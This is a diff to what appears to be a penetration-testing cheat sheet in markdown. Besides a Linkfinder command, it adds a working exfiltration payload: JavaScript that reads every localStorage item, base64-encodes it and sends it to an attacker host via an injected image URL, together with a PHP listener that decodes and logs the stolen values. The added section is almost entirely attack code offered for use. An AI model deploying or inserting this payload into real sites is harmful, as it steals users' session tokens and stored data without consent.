@@ -30,3 +30,28 @@ Using a proxy:
 
 ### Linkfinder
 `# for url in $(cat /root/Desktop/urls_js.txt); do python3 linkfinder.py -i $url -o cli; done`   
+
+## Sending Local Storage Items to Remote Server
+### JavaScript (client) 
+```
+newString = "";
+for (var a in localStorage) {
+    newString += a + "="
+    newString += localStorage[a];
+    // Encode the String
+    var encodedString = btoa(unescape(encodeURIComponent(newString)))
+    //console.log(newString);
+    //console.log(encodedString);
+    document.write('<img src="https://10.10.10.10/attackerswebapp/receiver.php?str='+encodedString+'">');
+    newString = "";
+}
+```
+### PHP listener (server)
+```
+<?php
+$encodedstr = $_GET["str"];
+$file = fopen('log.txt', 'a');
+$string = base64_decode($encodedstr);
+fwrite($file, $string . "\n\n");
+?>
+```
